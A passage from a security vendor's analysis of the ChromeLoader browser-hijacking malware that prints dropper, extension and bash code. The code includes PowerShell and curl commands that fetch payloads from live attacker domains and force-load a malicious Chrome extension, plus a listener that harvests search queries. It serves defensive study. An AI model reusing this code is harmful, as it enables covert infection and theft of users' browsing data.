archive, a task name, and a domain. The code suggests the malware's operational parameters, indicating where the malicious components are stored and pointing to the domain associated with the attack.\nTranscription: |\n  $extPath = \"$($env:LOCALAPPDATA)\\chrome\"\n  $confPath = \"$extPath\\conf.js\"\n  $archiveName = \"$($env:LOCALAPPDATA)\\archive.zip\"\n  $taskName = \"ChromeLoader\"\n  $domain = \"etterismype.co\"\n```\n\n*Figure 9. An example of variable definition in the PowerShell dropper.*\n\n```image\nAlt: An example of a payload download attempt.\nDescription: The image shows a portion of PowerShell code used within a malware campaign. It includes conditional statements that check for specific variables (`$dd` and `$ver`). The code attempts to unregister a scheduled task if a connection is successfully established and removes certain files. Additionally, it tries to download an archive file from a specified domain and then extracts its contents if the download is successful. Comments in the image explain the functionality of key sections of code.\nTranscription: |\n  if ($dd -and $ver){\n      try{\n          $un = wget \"https://$domain/un?did=$dd&ver=$ver\"\n          if($un -Match \"$dd\"){\n              Unregister-ScheduledTask -TaskName \"$taskName\" -Confirm:$false\n              Remove-Item -path \"$extPath\" -Force -Recurse\n          }\n      }catch{}\n      try{\n          wget \"https://$domain/archive.zip?did=$dd&ver=$ver\" -outfile \"$archiveName\"\n      }catch{}\n      if (Test-Path -Path \"$archiveName\"){\n          Expand-Archive -LiteralPath \"$archiveName\" -DestinationPath \"$extPath\" -Force\n          Remove-Item -path \"$archiveName\" -Force\n      }\n  }\n```\n\n*Figure 10. An example of a payload download attempt.*\n\n```image\nAlt: An attempt to load the payload into the user’s browser.\nDescription: The image displays a section of PowerShell code that attempts to manage Chrome processes. It includes commands to retrieve any running Chrome processes and close their main windows, followed by a command to restart Chrome with specific arguments for loading an extension from a provided path. The code is formatted in a programming style, emphasizing its technical nature, and is likely part of a malware analysis discussion.\nTranscription: |\n  try{\n      Get-Process chrome | ForEach-Object { $_.CloseMainWindow() | Out-Null }\n      Start-Process -FilePath $chromePath -ArgumentList --load-extension=\"$extPath\", --restore-last-session, --noerrdialogs, --disable-session-crashed-bubble\n  }\n  catch{\n  }\n```\n\n*Figure 11. An attempt to load the payload into the user’s browser.*\n\nThe evolution from early versions of this malware to later ones is also seen in the encoded PowerShell script. Figure 12 shows PowerShell script executed by an earlier version of this variant, which is significantly shorter and contains less complicated code.\n\n```image\nAlt: An example of an older version of this PowerShell dropper.\nDescription: The image depicts a snippet of PowerShell code related to malware activity. It shows a script that checks for the existence of a specific directory in the user's local app data and, if not found, attempts to download a zip archive from a specified URL. The script then expands the downloaded archive into the directory. It also includes logic to check if the Chrome browser is running and, if not, starts it while loading a specific extension from the downloaded content. The syntax and structure indicate that this script is designed to manipulate and control the browser environment as part of a malicious operation.\nTranscription: |\n  $extPath = \"$($env:LOCALAPPDATA)\\chrome\"\n  if(-not(Test-Path -Path $extPath)){\n      $archiveName = \"$($env:LOCALAPPDATA)\\archive.zip\"\n      try{\n          wget \"https://brokenna.work/archive.zip\" -outfile \"$archiveName\"\n      }catch{\n          break\n      }\n      Expand-Archive -LiteralPath \"$archiveName\" -DestinationPath \"$extPath\"\n  }\n  \n  $chromeProc = \"\"\n  try{\n      $chromeProc = (Get-WmiObject Win32_Process -Filter \"name='chrome.exe'\")[0] | Select-Object CommandLine\n      if(-not($chromeProc -Match \"load-extension\")){\n          Get-Process chrome | ForEach-Object { $_.CloseMainWindow() | Out-Null}\n          start chrome --load-extension=\"$extPath\", --restore-last-session\n          break\n      }\n  }catch{}\n```\n\n*Figure 12. An example of an older version of this PowerShell dropper.*\n\n---\n\n## Dropper Statistics\n\nChromeLoader attacks on Palo Alto Networks Cortex XDR customers were blocked by our Behavioral Threat Protection module starting from the first day of this campaign. However, we were curious about the following stages of this attack. Consequently, we decided to continue our research, tracking down the attacker’s footprints and intentions.\n\nThe scheduled task is using the malware to download a malicious Chrome extension and installing it to the victim’s browser. The URL hosting the Chrome extension is hardcoded in the obfuscated PowerShell command and changes between the different versions.\n\n   ```image\n   Alt: First infection attempt for installation servers.\n   Description: The image is a table displaying the installation servers used in a malware campaign, specifically ChromeLoader. It contains two columns: 'Installation Server' and 'First Connection Attempt.' Each row lists a different installation server along with the date of its first connection attempt, providing a clear overview of the timing and nature of these malicious activities.\n   Transcription: |\n     | Installation Server  | First Connection Attempt |\n     |----------------------|--------------------------|\n     | brokkena[.]work      | 2022-01-03               |\n     | learnataloukt[.]xyz  | 2022-01-06               |\n     | yflexibilityuky[.]co | 2022-01-08               |\n     | rsonalrecom[.]co     | 2022-01-11               |\n     | etterismype[.]co     | 2022-01-11               |\n     | idwhitdoe[.]work     | 2022-01-12               |\n     | ilsandothe[.]work    | 2022-01-12               |\n     | ithconsukultin[.]com | 2022-01-12               |\n     | eadirtlseiv[.]work   | 2022-01-12               |\n     | roosson ech[.]work   | 2022-01-12               |\n     | yeconnected[.]com    | 2022-01-13               |\n   ```\n\n*Figure 13. First infection attempt for installation servers.*\n\n```image\nAlt: Installation server connection attempts distribution.\nDescription: The image is a pie chart displaying the distribution of installation server connection attempts for ChromeLoader malware. Different segments represent various domains used in the attacks, with percentages indicating the proportion of connection attempts associated with each domain. The largest segment is labeled 'yflexibilityuk[.]co' at 38.5%, followed by 'brokenna[.]work' at 15.4%, and several other domains with smaller percentages.\nTranscription: |\n  yflexibilituky[.]co     38.5%\n  brokenna[.]work         15.4%\n  learnataloukt[.]        12.3%\n  etterismype[.]co        10.8%\n  ithconsukltin[.]        7.7%\n  rsonalrecom[.]co        3.1%\n  idwhitdoe[.]work        4.6%\n  yeconnected[.]          3.1%\n  ilsandothe[.]work       1.5%\n```\n\n*Figure 14. Installation server connection attempts distribution.*\n\n```image\nAlt: Blocked infections per region.\nDescription: The image is a bar chart illustrating the distribution of blocked infections from a malware campaign across different regions. The x-axis represents geographical areas labeled as 'US', 'EU', and 'CA', while the y-axis indicates the number of blocked infections. The chart shows a significant spike in blocked infections in the US (56), with lower counts in the EU (8) and CA (1), highlighting the regional impact of the malware activity.\nTranscription: |\n  Blocked infections per region:\n  \n  | Region | Blocked Infections |\n  |--------|--------------------|\n  | US     | 56                 |\n  | EU     | 8                  |\n  | CA     | 1                  |\n```\n\n*Figure 15. Blocked infections per region.*\n\n```image\nAlt: Infection attempts per day per installation server during the Variant 1’s most active time.\nDescription: The image is a bar chart illustrating the number of infection attempts per day for various installation servers during a malware campaign. The x-axis represents dates from January 3 to February 16, while the y-axis indicates the count of infection attempts. Different colored bars represent distinct installation servers, highlighting peaks of activity on certain dates, particularly January 9 and January 13, with most servers showing limited attempts on other days.\nTranscription: |\n  | Date  | roossonech[.]work | ilsandothe[.]work | idwhitdoe[.]work | eadirtlseiv[.]work | rsonalrecom[.]co | etterismype[.]co | yflexibilituky[.]co | learnataloukt[.]xyz | brokenna[.]work | yeconnected[.]com | ithconsukultin[.]com |\n  |-------|-------------------|-------------------|------------------|--------------------|------------------|------------------|---------------------|---------------------|-----------------|-------------------|----------------------|\n  | 01-03 | 1                 | 0                 | 0                | 0                  | 0                | 0                | 0                   | 0                   | 0               | 0                 | 0                    |\n  | 01-05 | 0                 | 0                 | 0                | 0                  | 0                | 0                | 0                   | 0                   | 0               | 0                 | 0                    |\n  | 01-07 | 1                 | 1                 | 0                | 0                  | 0                | 0                | 0                   | 0                   | 0               | 0                 | 0                    |\n  | 01-09 | 8                 | 1                 | 0                | 0                  | 0                | 0                | 0                   | 0                   | 0               | 0                 | 0                    |\n  | 01-11 | 2                 | 0                 | 0                | 0                  | 0                | 0                | 0                   | 0                   | 0               | 0                 | 0                    |\n  | 01-13 | 3                 | 0                 | 0                | 0                  | 0                | 0                | 0                   | 0                   | 0               | 0                 | 0                    |\n  | 01-15 | 0                 | 0                 | 0                | 0                  | 0                | 0                | 0                   | 0                   | 0               | 0                 | 0                    |\n  | 01-17 | 0                 | 0                 | 0                | 0                  | 0                | 0                | 0                   | 0                   | 0               | 0                 | 0                    |\n  | 01-19 | 0                 | 0                 | 0                | 0                  | 0                | 0                | 0                   | 0                   | 0               | 0                 | 0                    |\n  | 01-21 | 0                 | 0                 | 0                | 0                  | 0                | 0                | 0                   | 0                   | 0               | 0                 | 0                    |\n  | 01-23 | 0                 | 0                 | 0                | 0                  | 0                | 0                | 0                   | 0                   | 0               | 0                 | 0                    |\n  | 01-25 | 0                 | 0                 | 0                | 0                  | 0                | 0                | 0                   | 0                   | 0               | 0                 | 0                    |\n  | 01-27 | 0                 | 0                 | 0                | 0                  | 0                | 0                | 0                   | 0                   | 0               | 0                 | 0                    |\n  | 01-29 | 0                 | 0                 | 0                | 0                  | 0                | 0                | 0                   | 0                   | 0               | 0                 | 0                    |\n  | 01-31 | 0                 | 0                 | 0                | 0                  | 0                | 0                | 0                   | 0                   | 0               | 0                 | 0                    |\n  | 02-02 | 0                 | 0                 | 0                | 0                  | 0                | 0                | 0                   | 0                   | 0               | 0                 | 0                    |\n  | 02-04 | 0                 | 0                 | 0                | 0                  | 0                | 0                | 0                   | 0                   | 0               | 0                 | 0                    |\n  | 02-06 | 0                 | 0                 | 0                | 0                  | 0                | 0                | 0                   | 0                   | 0               | 0                 | 0                    |\n  | 02-08 | 0                 | 0                 | 0                | 0                  | 0                | 0                | 0                   | 0                   | 0               | 0                 | 0                    |\n  | 02-10 | 0                 | 0                 | 0                | 0                  | 0                | 0                | 0                   | 0                   | 0               | 0                 | 0                    |\n  | 02-12 | 0                 | 0                 | 0                | 0                  | 0                | 0                | 0                   | 0                   | 0               | 0                 | 0                    |\n  | 02-14 | 0                 | 0                 | 0                | 0                  | 0                | 0                | 0                   | 0                   | 0               | 0                 | 0                    |\n  | 02-16 | 0                 | 0                 | 0                | 0                  | 0                | 0                | 0                   | 0                   | 0               | 0                 | 0                    |\n```\n\n*Figure 16. Infection attempts per day per installation server during the Variant 1’s most active time.*\n\n---\n\n## Payload\n\nThe payload of the malware is a Chrome extension – every downloadable extension has the same format:\n\n```image\nAlt: An example of the downloaded extension files.\nDescription: The image displays a file directory structure showing various files associated with a malware Chrome extension. It includes four files: 'background.js', 'conf.js', 'manifest.json', and 'settings.png', along with details such as the date modified, file type, and file size for each. This layout suggests the components of the malware payload, emphasizing its organizational structure, with the JavaScript files likely containing the malicious code.\nTranscription: |\n  Name                Date modified     Type                Size\n  background.js       1/6/2022 10:39    JavaScript File     13 KB\n  conf.js             1/6/2022 10:39    JavaScript File     1 KB\n  manifest.json       1/6/2022 10:39    JSON File           1 KB\n  settings.png        1/6/2022 10:39    PNG File            4 KB\n```\n\n*Figure 17. An example of the downloaded extension files.*\n\nUsing some definitions in the `manifest` file, and using a known legitimate picture, the extension claims to be legitimate and harmless. However, the extension asks for elevated privileges. Requested privileges include accessing browser data, manipulating web requests and accessing every possible URL address, which legitimate browser extensions would not do.\n\n```image\nAlt: An example of a downloaded extension’s manifest file.\nDescription: The image displays a snippet of a `manifest.json` file used for a Chrome extension. It shows the structure of the file, including fields such as `name`, `version`, `description`, and `permissions`. Key highlights are boxed in red, indicating that the extension pretends to be legitimate by changing its name and description to 'Settings' and that it requests elevated permissions, including access to browser data, web requests, and manipulation of browsing activity. This suggests that the extension is potentially malicious.\nTranscription: |\n  json\n  {\n    \"name\": \"Settings\",\n    \"version\": \"3.0\",\n    \"description\": \"Settings\",\n    \"icons\": {\n      \"128\": \"settings.png\"\n    },\n    \"browser_action\": {\n      \"default_icon\": {\n        \"128\": \"settings.png\"\n      }\n    },\n    \"default_title\": \"Settings\",\n    \"background\": {\n      \"scripts\": [\"conf.js\", \"background.js\"]\n    },\n    \"permissions\": [\n      \"contextMenus\",\n      \"tabs\",\n      \"storage\",\n      \"browsingData\",\n      \"webRequest\",\n      \"webRequestBlocking\",\n      \"privacy\",\n      \"alarms\",\n      \"management\",\n      \"*://*/*\",\n      \"chrome://*/*\"\n    ],\n    \"content_security_policy\": \"script-src 'self' 'unsafe-eval'; object-src 'self'\",\n    \"manifest_version\": 2\n  }\n```\n\n*Figure 18. An example of a downloaded extension’s manifest file.*\n\nThe Javascript file `conf.js` declares constant variables, which will use the main script `background.js` later. The C2 domain is stored in `_ExtDomNoSchema`.\n\n```image\nAlt: An example of a downloaded extension’s conf.js file.\nDescription: The image displays a snippet of JavaScript code related to a malicious Chrome extension. The code defines several variables: `_ExtensionName`, `_ExtensionVersion`, `_dd`, `_ExtDom`, and `_ExtDomNoSchema`. These variables seem to store the name and version of the extension, alongside a potentially encoded string and a URL pointing to `krestinaful.com`. This snippet contributes to understanding the extension's functionality and its connection to a command-and-control domain.\nTranscription: |\n  let _ExtensionName = \"Settings\";\n  let _ExtensionVersion = \"3.0\";\n  let _dd = \"ODQxOTUNBgEKDAAAAw8NDwEGCwwOAwMLSQ8HBgoHAUgADwEJAAQBBwAATQ==;\";\n  let _ExtDom = \"https://krestinaful.com/\";\n  let _ExtDomNoSchema = \"krestinaful.com\";\n```\n\n*Figure 19. An example of a downloaded extension’s conf.js file.*\n\n`background.js` is a one-line JavaScript file containing all of the extension’s functionality; it is heavily obfuscated but can be converted to readable JavaScript code in a short series of steps. However, any attempt to deobfuscate this code using known public JavaScript deobfuscation tools will fail due to reasons which will be detailed later.\n\n```image\nAlt: An example of a downloaded extension’s obfuscated background.js file.\nDescription: The image appears to show a snippet of JavaScript code, likely part of an obfuscated script used in a malware campaign. The code includes a function definition with a variable 'v' initialized to 2 and a switch statement that handles various cases based on the value of 'v'. Each case includes a return statement and breaks, indicating control flow changes depending on the value of 'v'. The overall structure suggests complexity aimed at obfuscation to hinder analysis.\nTranscription: s0QQ.W3=(function(){var v=2;for(;v!==9){switch(v){case 1:return globalThis;break;case 2:v=typeof globalThis === '\\u006f\\u0062';}}});\n```\n\n*Figure 20. An example of a downloaded extension’s obfuscated background.js file.*\n\nThis script uses various obfuscation techniques to hide its purpose and malicious code. One of the first functions executed is responsible for copying standard JavaScript functions and objects into new objects with scrambled names, which will later use the script for decoding the final payload, located in this script's last instructions.\n\n```image\nAlt: An example of the renaming mechanism. For instance, in this case, the String object is stored as b4VV.\nDescription: The image shows a snippet of JavaScript code likely intended for analysis, displaying various functions and objects such as 'sort()', 'random()', and 'String()'. The code appears to be heavily obfuscated, indicated by the non-descriptive variable names like 'x.o4VV', 'U4VV.K4VV', and 'b4VV.P4V'. This snippet suggests that it is part of a larger codebase, possibly related to malware, and is intended for understanding or deobfuscating the functionality of the malware's JavaScript.\nTranscription: |\n  x.o4VV\n    f sort() { [native code] }\n  \n  U4VV\n    ▷ Math { abs: f, acos: f, acosh: f, asin: f, asinh: f, ... }\n  \n  U4VV.K4VV\n    f random() { [native code] }\n  \n  b4VV\n    f String() { [native code] }\n  \n  b4VV.P4VV\n    f fromCharCode() { [native code] }\n  \n  x.e4VV\n    f push() { [native code] }\n```\n\n*Figure 21. An example of the renaming mechanism. For instance, in this case, the String object is stored as b4VV.*\n\nDuring the entire execution of this script, the authors use switch-case-oriented programming to make their program harder for malware analysts to read and understand.\n\n```image\nAlt: An example of switch-case-oriented programming.\nDescription: The image presents a snippet of JavaScript code demonstrating an obfuscated function. It features various control structures such as a for loop and a switch statement, showcasing how the malware utilizes obfuscation techniques to complicate reverse engineering. The code is heavily commented to indicate the purpose of certain lines, and it contains references to function calls and variable assignments, which are typical in malicious scripts to hide their true intentions. The specific use of scrambled variable names and comments provides insight into the method of obfuscation employed by the malware authors.\nTranscription: |\n  var $0 = function(I3) {\n      var E3 = 2;\n      for (; E3 !== 13;) {\n          switch (E3) {\n              case 1:\n              case 4:\n                  T0.e4VV(b4VV.P4VV(I3[X0] + 50));\n                  // T0.push(String.fromCharCode(I3[X0] + 50));\n                  T0 = ['0', 'h', 'Q', 'Q'];\n                  E3 = 3;\n                  break;\n              case 3:\n                  ...\n              case 5:\n                  ...\n              case 14:\n                  ...\n              case 9:\n                  ...\n              case 8:\n                  u3 = T0.o4VV(function() {\n                      u3 = T0.sort(function() {\n                          var V3 = 2;\n                          for (; V3 !== 1;) {\n                              switch (V3) {\n                                  case 2:\n                                      return 0.5 - U4VV.K4VV();\n                                      // return 0.5 - Math.random();\n                                      break;\n                              }\n                          }\n                      });\n                  }).A4VV('');\n                  p3 = s0QQ[u3];\n                  E3 = 6;\n                  break;\n              case 2:\n                  ...\n              case 6:\n                  ...\n          }\n      }\n  };\n  var x0 = '',\n      J0 = c4VV($0([-2, 54, 31, 31]))();\n  // J0 = decodeURI($0([-2, 54, 31, 31]))();\n```\n\n*Figure 22. An example of switch-case-oriented programming.*\n\nThe program loops using the `E3` variable shown above in Figure 22 and acts differently for each value. When the relevant flow in the switch case has ended, the program changes the value of `E3` to its next instruction. The program also uses the obfuscated object names mentioned previously. In Figure 22, we added the original object name in a comment below the relevant code line.\n\nAfter understanding the obfuscated names and switch-case-oriented programming, we can better analyze the purpose of this code section. It uses a hardcoded four-sized array of integers, translating it to the associated ASCII characters and sorting it by randomized order. Later, this array will be joined to a string, and the program will search for a defined function in that name. The execution flow will start over if the function isn’t found.\n\nThis stage reveals another obfuscation technique in the script. One of the key features used by standard deobfuscation tools is dropping unreferenced functions and objects. Often, it helps to shorten the code, leaving out complicated parts which will never actually run – removing functions whose whole purpose is to mislead a malware analyst. However, in this case, using deobfuscation tools drops an essential function, and the script will be stuck in an endless loop without it.\n\nThe function `h0QQ` is not directly referenced even once during the script execution. Yet, the previously mentioned code section using a randomized sort algorithm will eventually attempt to execute it, since `h0QQ` is a permutation of the `0hQQ` string. If `h0QQ` does not exist, the code simply tries to sort the characters and repeatedly looks for a function name.\n\n```image\nAlt: An example of the unreferenced crucial function.\nDescription: The image displays a snippet of JavaScript code defining a function named `h0QQ`. This function is designed to return a long, encoded string that appears to include various encoded characters and symbols. The context suggests that this string is part of a malware script, specifically for the ChromeLoader malware campaign. The code is presented in a code editor format, highlighting its importance in the analysis of the malware's operation.\nTranscription: |\n  function h0QQ() {\n      return \"MC/449%5CT;%00;,_%5E,(12%16J0*%3C%25%5BY8%3E%60,%5B%5E.:?12LT8%3C86JR+%1F%3C%25Y%5C04:2LJ2412VV7'&$H%5D*;&%7CC%5B,&3,%.\";\n  }\n```\n\n*Figure 23. An example of the unreferenced crucial function.*\n\nThis function returns a long scrambled string, XORed by a hardcoded key, and then splits into an array of strings.\n\n```image\nAlt: An example of a deXORed array containing strings used by the malware.\nDescription: The image displays a snippet of JavaScript code, specifically an array containing various strings related to JSON operations and potential browser storage functions. This snippet is likely part of a malware script, as suggested by the context provided. The strings include terms such as 'application/json', 'stringify', 'getItem', 'setItem', and others, which are commonly associated with data manipulation in web applications. The context indicates that this code is used for managing data within the malware's functioning, possibly for its operation in a compromised browser environment.\nTranscription: |\n  json\n  [\n      'application/json',\n      'stringify',\n      'getTime',\n      'setItem',\n      'getItem',\n      'expiry',\n      'removeItem',\n      'value',\n      'ad?ext=',\n      'follow'\n  ]\n```\n\n*Figure 24. An example of a deXORed array containing strings used by the malware.*\n\nThe malware eventually uses these strings to decode its malicious code. It references the string at the relevant index in this array instead of hardcoding the string name in the code.\n\n```image\nAlt: An example of the malware usage of the deXORed array to decode its final payload. You can also see that the malware doesn’t use integers as the array’s indexes but strings combined with arithmetic operations.\nDescription: The image displays a snippet of JavaScript code used in a Chrome extension, specifically related to malware functionality. It includes references to properties and methods associated with the Chrome API, particularly focusing on how the extension interacts with the browser environment. The code employs obfuscated variable names and operations, which are common techniques in malware to make analysis difficult. This code snippet is part of a broader discussion in the context of analyzing the ChromeLoader malware.\nTranscription: |\n  chrome[s0QQ.c3(+ \"39\")][s0QQ.c3(\"50\" >> 0)](_ExtDom + s0QQ.A3(+ \"51\") + _ExtensionName + s0QQ.c3(+ \"2\") + _ExtensionVersion + s0QQ.A3(\"3\" << 32) + _dd);\n  {\n      title: s0QQ.c3(+ \"53\"),\n      id: s0QQ.A3(+ \"54\"),\n      contexts: [s0QQ.c3(\"55\" - 0)]\n  });\n```\n\n*Figure 25. An example of the malware usage of the deXORed array to decode its final payload. You can also see that the malware doesn’t use integers as the array’s indexes but strings combined with arithmetic operations.*\n\nWe exported the mentioned list members after utilizing a debugger to execute the initialization code. Then we used a Python script to deobfuscate the remaining sections of the JavaScript code.\n\n```image\nAlt: A script used for deobfuscating background.js.\nDescription: The image displays a Python script designed for deobfuscating JavaScript code associated with malware. It includes functions that manipulate and analyze JavaScript objects, handle mathematical expressions, and replace specific strings based on a predefined dictionary. The script employs regular expressions to locate and modify obfuscated elements within the JavaScript code, aiming to make the code more readable and understandable for analysis.\nTranscription: |\n  import re\n  import js2py\n  \n  words_dict = ['ext=' , '&ver=' , '&dd=' , 'sendBeacon' , 'parse' , 'list' , 'log' , 'forEach' , 'management' , 'setEnabled' , 'https://com.' , '/ext' , 'post' , 'Accept' , 'application/json' , 'application/x-www-form-urlencoded']\n  \n  main_obj_post = ['.B1(@idx)' , '.E1(@idx)']\n  main_obj_pre = ['y9RR']\n  \n  def find_and_remove_main_obj_copies(origin_text):\n      # storing all copies of the main object - y9RR\n      global main_obj_pre\n      matches = re.findall(r'var (\\w+);', origin_text)\n      for m in matches:\n          main_obj_pre.append(m)\n      return re.sub(r'var (\\w+);', {main_obj_pre[0]: \"\"}, origin_text)\n  \n  def replace_js_arithmetic_with_result(origin_text):\n      return_text = origin_text\n      js_arit = r'\\\"(\\d+\\\"|\\+|\\*|\\%|\\[|\\])'\n      all_matches = re.findall(js_arit, origin_text)\n      for match in all_matches:\n          if len(match) > 15:\n              continue\n          result = js2py.eval_js(match)\n          result = '(' + str(result) + ')'\n          return_text = return_text.replace(match, result)\n  \n      return return_text\n  \n  def replace_words_table_with_values(origin_text):\n      return_text = origin_text\n      for idx in range(len(words_dict)):\n          for prefix_str in main_obj_pre:\n              post_str = main_obj_post[idx].replace(\"@idx\", str(idx)) + ']'\n              return_text = return_text.replace(current_search_str, '[' + prefix_str + post_str + ']' )\n              return_text = return_text.replace(return_text[1:-1], '\\'' + words_dict[idx] + '\\'')\n  \n      return return_text\n  \n  def deobfuscate_js(obfuscated_js_code):\n      return replace_words_table_with_values(replace_js_arithmetic_with_result(find_and_remove_main_obj_copies(obfuscated_js_code)))\n```\n\n*Figure 26. A script used for deobfuscating background.js.*\n\n---\n\n## Infostealer and Adware\n\nFor communicating with the malicious extension, the authors used command and control servers (C2s), which are different from the installation server used for installing the extension previously. The malware uses various extension features, giving it a strong foothold in the user’s browser.\n\n```image\nAlt: An example of alerts installed by the malware.\nDescription: The image displays a snippet of JavaScript code that is part of a malicious Chrome extension. It shows the use of the Chrome API to set up listeners for installation events and to create alarms for scheduled tasks. Specifically, it handles the removal of certain local storage items upon installation and establishes two alarms: one for a heartbeat ('hb') function with a delay of 1.1 minutes and a period of 180 minutes, and another for an advertisement ('ad') function with a delay of 5 minutes and a period of 30 minutes.\nTranscription: |\n  chrome.runtime.onInstalled.addListener(o => {\n      if (o.reason == 'install') {\n          localStorage.removeItem('lastQuery');\n          localStorage.removeItem('ad');\n          localStorage.removeItem('is');\n          chrome.alarms.create('hb', {\n              delayInMinutes: 1.1,\n              periodInMinutes: 180\n          });\n      });\n      chrome.alarms.create('ad', {\n          delayInMinutes: 5,\n          periodInMinutes: 30\n      });\n  });\n```\n\n*Figure 27. An example of alerts installed by the malware.*\n\nWhen the extension is installed, it adds two Chrome alarms (alarms allow the developer to install a callback / scheduled task that will be triggered periodically). When these alarms are triggered, two corresponding functions are being called:\n\n- When the `ad` alarm is triggered, the extension asks the C2 for an advertisement and presents it in a new tab.\n- The `hb` callback is triggering functions that communicate with the C2, informing it of the current state of the execution.\n\n```image\nAlt: An example of the malware’s reaction when its alerts are triggered.\nDescription: The image shows a snippet of JavaScript code related to the ChromeLoader malware campaign. It specifically demonstrates how the malware sets up event listeners for two alarms named 'hb' and 'ad' using the Chrome Alarms API. When the 'hb' alarm is triggered, it calls the 'analytics' function, and when the 'ad' alarm is triggered, it invokes the 'getAd' function. This illustrates part of the functionality that allows the malware to communicate with its command and control server and manage its operations.\nTranscription: |\n  chrome.alarms.onAlarm.addListener(function(b6) {\n      if (b6.name === 'hb') {\n          analytics('hb', '');\n          sync();\n      } else if (b6.name === 'ad') {\n          getAd();\n      }\n  });\n```\n\n*Figure 28. An example of the malware’s reaction when its alerts are triggered.*\n\nAnother interesting activity can be seen in the code shown in Figure 29. The extension installs a listener, which allows it to intercept every outgoing request, and uses it to check whether the request was sent to a search engine – Google, Yahoo or Bing. If it does, the extension will send the search details to the C2, leaking the victim’s thoughts and interests.\n\n```image\nAlt: An example of browser hijacker capability.\nDescription: The image contains a code snippet written in JavaScript, showcasing a Chrome extension's listener that intercepts web requests. It checks if the request is directed to popular search engines like Google, Yahoo, or Bing, and retrieves certain search parameters from the URL. The code is structured to identify specific conditions under which it processes the incoming requests, indicating functionality related to potential data leakage from the user's searches.\nTranscription: |\n  chrome.webRequest.onBeforeRequest.addListener(function(V) {\n      var p, B, L, u, N, T, Z, E, q;\n      if (V.type !== 'main_frame') {\n          return null;\n      }\n      p = V.url;\n      B = new URL(p);\n      if (p.indexOf('google.') >= 0 && p.indexOf('search') >= 0 && p.indexOf('q=') >= 0) {\n          L = B.searchParams.get('q');\n      }\n      if (p.indexOf('search.yahoo.') >= 0 && p.indexOf('p=') >= 0) {\n          L = B.searchParams.get('p');\n      }\n      if (p.indexOf('bing.') >= 0 && p.indexOf('search') >= 0 && p.indexOf('q=') >= 0) {\n          L = B.searchParams.get('q');\n      }\n  });\n```\n\n*Figure 29. An example of browser hijacker capability.*\n\nIn addition, the extension uses different mechanisms to verify that it executes properly. For example:\n\n- A hard-coded header named `dd` for each outgoing packet to the C2. This could be used by the C2 to identify the different distribution channels/affiliates.\n\n```image\nAlt: An example of the added dd header.\nDescription: The image displays a screenshot of HTTP request headers, which includes details such as the request method, path, scheme, and various accepted content types. Notably, it highlights a hard-coded header labeled 'dd' with a base64-encoded string value. This header is part of a cybersecurity analysis related to the ChromeLoader malware campaign, indicating its attempt to communicate with command and control servers.\nTranscription: |\n  Request Headers\n  :authority: tobepartou.com\n  :method: GET\n  :path: /redsync\n  :scheme: https\n  accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\n  accept-encoding: gzip, deflate, br\n  accept-language: en-US,en;q=0.9\n  dd: NTI4MDAAcgABwYHDAAIQIMCQgDB0GTAD0AcFDU43BgQHgoBAwA=\n```\n\n*Figure 30. An example of the added dd header.*\n\n- Cancelling search suggestions, probably in order to make sure that the search queries were intended by the user.\n- Uninstalling existing Chrome extensions from the browser. It also sends the names of the extensions to the C2 and gets back an `allowlist` json, in order to exclude chosen extensions from being removed.\n- Disabling every attempt to access `chrome://extensions` and open `chrome://settings` instead to prevent the user from uninstalling this malicious extension.\n\n---\n\n## Version Control\n\nMost malicious extensions contained a file named `conf.js` alongside the main Javascript code stored at `background.json`. This `conf.js` (or `manifest.json`, or `background.js` file if `conf.json` is missing) file stores relevant configuration for the extension: the C2’s hostname (e.g., `krestinaful[.]com` and `tobepartou[.]com`), the verification header’s value of `dd`, the extension name, and its version. It seems like the version information is accurate – there are several differences between the versions we saw (2.0, 3.0, and 4(.0,.3,.4)). (For our observations on the relationship between variants and versions, please see the “Introduction” section.)\n\n### Version 2.0 (First seen Jan. 4, 2022):\n\nMissing functionality:\n\n- No advertisements for victims.\n- Search engine query gathering from Google only.\n- No deletion of existing browser extensions.\n\n### Version 3.0 (Jan. 6, 2022):\n\nAdded functionality:\n\n- Search engine queries are now gathered from Yahoo and Bing as well.\n- `SetWithExpiry()` and `GetWithExpiry()` functions added and used for storing variables (i.e., query URL) and deleting existing extensions, respectively.\n- Existing extensions deletion mechanism.\n\n### 4.* versions (Jan. 7, 2022):\n\nAdded functionality:\n\n- More obfuscations throughout the script.\n- Chrome advertising mechanism added.\n- Changed the hardcoded C2 URL.\n- Chrome alert mechanism.\n\n---\n\n## MacOS variant\n\nIn March 2022, a new variant emerged targeting MacOS users. This variant remains active and uses similar techniques to install its payload and hide its actions. It uses the same infection method of directing victims to compromised pay-per-download websites to install its dropper.\n\nIn this case, the dropper is a disk image (DMG) file – the MacOS implementation for ISO files – containing several files, including one bash script. The bash script resembles the scheduled PowerShell script in multiple manners:\n\n- Downloads the payload – a browser extension from a remote installation server.\n- Loads the payload into the target’s browsers – Google Chrome and the built-in Safari browser.\n\n```image\nAlt: An example of an early version of the MacOS installation script.\nDescription: The image displays a section of a bash script that is related to the ChromeLoader malware campaign targeting MacOS. The script includes commands that utilize `curl` to check the HTTP status code of a URL and, based on that code, attempts to perform an action associated with opening Google Chrome and loading a browser extension. The script is written in a terminal-style format, using syntax highlighting for clarity.\nTranscription: |\n  status_code=$(curl --write-out %{http_code} --head --silent --output /dev/null https://funbeachdude.com/gp)\n  if [[ \"$status_code\" = 200 ]] ; then\n      popUrl=$(curl -s 'https://funbeachdude.com/gp')\n      performPop=$(echo -ne \"open -na 'Google Chrome' --args -load-extension='$BPATH/$XPATH' --new-window '$popUrl';\" | base64);\n  else\n      popUrl=\"0\"\n  fi\n```\n\n*Figure 31. An example of an early version of the MacOS installation script.*\n\nIn more advanced cases, instead of hardcoding the download execute portion in the bash script, the authors encoded these commands in a separate file, then decoded and executed by the bash script using OpenSSL.\n\n```image\nAlt: An example of a later MacOS installation script.\nDescription: The image displays a snippet of a bash script, which is part of a malware installation process targeting MacOS. The script includes various commands and variables related to setting up directories, downloading payloads, and executing commands obfuscated through encoding. It features a structure common in malicious scripts, such as the use of 'nohup' and redirection to '/dev/null', indicating an attempt to run processes in the background and avoid detection.\nTranscription: |\n  #!/bin/bash\n  G='a';F='c';Q='d';H='e';V='l';Z='m';X='n';T='o';J='p';k='s';\n  export appDir=$(cd \"$(dirname \"$0\")\"; pwd -P)\n  export tmpDir=\"$(mktemp -d /tmp/XXXXXXXXXXXX)\"\n  export binFile=\"$(cd \"$appDir\"; ls | grep -Ev '\\.(command)$' | head -n 